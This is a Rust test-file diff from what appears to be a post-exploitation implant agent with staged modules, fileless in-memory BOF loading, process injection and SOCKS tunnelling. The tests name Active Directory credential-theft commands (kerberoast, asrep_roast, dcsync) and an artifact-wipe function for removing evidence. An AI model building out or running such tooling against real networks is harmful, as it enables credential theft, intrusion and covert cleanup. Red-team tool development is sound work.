@@ -60,16 +60,87 @@ fn encrypt_rejects_wrong_key_length_without_panic() {
 
 #[test]
 fn inject_not_in_product_minimal() {
-    // Sole product tier is minimal; inject is L2-only (`cupcake-mod-inject`).
+    // Sole product tier is minimal; inject is L2-only (`cupcake-inject-worker`).
+    // (Skipped when tests run with `inject` unified in, e.g. `cargo test --workspace`
+    // — same pattern as the bof gate below. Product builds still fail closed.)
+    #[cfg(not(feature = "inject"))]
     assert!(
         !cfg!(feature = "inject"),
-        "inject must not be compiled into Stage0 product agent (use L2 mod_inject)"
+        "inject must not be compiled into Stage0 product agent (use L2 cupcake-inject-worker)"
     );
+}
+
+#[test]
+fn ad_commands_require_ad_module_not_stage0() {
+    use crate::module_loader::{is_ad_command, module_for_command, MOD_AD, MOD_INJECT};
+    // Design gate table samples
+    for ct in [
+        "ad_discover",
+        "kerberoast",
+        "asrep_roast",
+        "dcsync",
+        "ad_ping",
+        "ad_enum_users",
+        "ad_graph_collect",
+    ] {
+        assert!(is_ad_command(ct), "{ct} should be AD command");
+        assert_eq!(
+            module_for_command(ct),
+            Some(MOD_AD),
+            "{ct} must gate on ad"
+        );
+    }
+    // Daily ops must not require ad
+    assert_eq!(module_for_command("shell"), None);
+    assert_eq!(module_for_command("file_list"), None);
+    assert_eq!(module_for_command("process_list"), None);
+    // inject not regressed
+    assert_eq!(module_for_command("process_inject"), Some(MOD_INJECT));
+    // Stage0 wipe is not worker-gated
+    assert_eq!(module_for_command("ad_artifact_wipe"), None);
+    assert!(!is_ad_command("ad_artifact_wipe"));
+}
+
+#[test]
+fn ad_artifact_wipe_path_safety() {
+    use crate::ad_artifact::{parse_wipe_path, wipe_ad_artifact};
+    // Traversal must fail
+    let err = wipe_ad_artifact("..\\cpx_ad_x.out").expect_err("traversal");
+    assert!(
+        err.contains("traversal") || err.contains("outside") || err.contains("access_denied"),
+        "{err}"
+    );
+    // Wrong prefix under temp
+    let bad = std::env::temp_dir().join("evil.txt");
+    let err = wipe_ad_artifact(bad.to_str().unwrap()).expect_err("prefix");
+    assert!(err.contains("cpx_ad_"), "{err}");
+    // Happy path
+    let p = std::env::temp_dir().join(format!("cpx_ad_gate_{}.out", std::process::id()));
+    std::fs::write(&p, b"x").unwrap();
+    wipe_ad_artifact(p.to_str().unwrap()).expect("wipe");
+    assert!(!p.exists());
+    assert!(parse_wipe_path(r#"{"path":"cpx_ad_z.out"}"#, None)
+        .unwrap()
+        .starts_with("cpx_ad_"));
+}
+
+#[test]
+fn ensure_ad_missing_yields_module_required() {
+    use crate::module_loader::ensure_module_for_command;
+    let err = ensure_module_for_command("kerberoast").expect_err("no ad staged");
+    assert!(
+        err.contains("module_required:ad"),
+        "got: {err}"
+    );
+    let err2 = ensure_module_for_command("ad_discover").expect_err("no ad staged");
+    assert!(err2.contains("module_required:ad"), "got: {err2}");
 }
 
 #[test]
 fn product_minimal_has_no_fat_or_in_process_runtime() {
     // Product = minimal only. No Stage0 BOF/.NET loaders, logging, multi-rt, plugin, stealth-adv.
+    // (Skipped when tests are explicitly run with --features bof, i.e. L2 config testing.)
+    #[cfg(not(feature = "bof"))]
     assert!(!cfg!(feature = "bof"), "bof not in product Stage0");
     assert!(!cfg!(feature = "dotnet"), "dotnet not in product Stage0");
     assert!(!cfg!(feature = "logging"), "logging not in product Stage0");
@@ -91,6 +162,12 @@ fn product_minimal_core_caps() {
     assert!(cfg!(feature = "module-loader"), "module-loader in minimal");
     assert!(cfg!(feature = "post-ex"), "post-ex in minimal");
     assert!(cfg!(feature = "pty"), "pty in minimal");
+    // mem-map IS product now: fileless Manual-Map for L2 mod_bof (classic in-process
+    // BOF engine). No iso_host, so mapped regions are limited to staged modules.
+    assert!(
+        cfg!(feature = "mem-map"),
+        "mem-map required in product minimal for fileless mod_bof loading"
+    );
 }
 
 #[test]
@@ -100,7 +177,6 @@ fn yamux_stream_type_constants_match_design_table() {
     assert_eq!(YAMUX_STREAM_SOCKS, 0x02);
     assert_eq!(YAMUX_STREAM_FS, 0x03);
     assert_eq!(YAMUX_STREAM_PROCESS, 0x04);
-    assert_eq!(YAMUX_STREAM_DESKTOP, 0x0D);
     assert_eq!(YAMUX_STREAM_FILE, 0x0E);
     assert_eq!(YAMUX_STREAM_RESERVED, 0xFF);
 }
